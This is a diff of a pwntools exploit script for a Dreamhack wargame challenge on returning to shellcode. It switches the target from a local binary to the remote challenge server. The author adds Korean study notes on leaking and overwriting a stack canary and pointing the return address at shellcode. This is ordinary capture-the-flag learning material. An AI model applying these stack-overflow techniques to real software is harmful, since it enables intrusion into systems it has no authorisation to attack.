@@ -8,7 +8,8 @@ context.binary = '/home/user/Desktop/Dreamhack/Exploit_ReturnToShellcode/r2s'
 
 def slog(n, m): return success(': '.join([n, hex(m)]))
 
-p = process(context.binary.path)
+# p = process(context.binary.path)
+p = remote(host="host8.dreamhack.games", port=18033)
 
 # [1] Get information about buf
 p.recvuntil(b'buf: ')
@@ -51,4 +52,3 @@ p.interactive()
 - 전형적인 스택 카나리 값을 받아 다시 덮어쓰면서 리턴 주소를 쉘 코드로 지정하는 기법이다.
 - 페이로드 작성 시 더 깔끔한 코드 작성 가능한 것에 염두하자.
 - 아직 카나리 덮어쓸 때 필요한 1바이트 더 보내는 것, 수신 후 1바이트는 다시 \x00으로 되돌리는 것, 최종 페이로드에서 패딩 넣는 기법이 미숙한 것 같다.
-- 
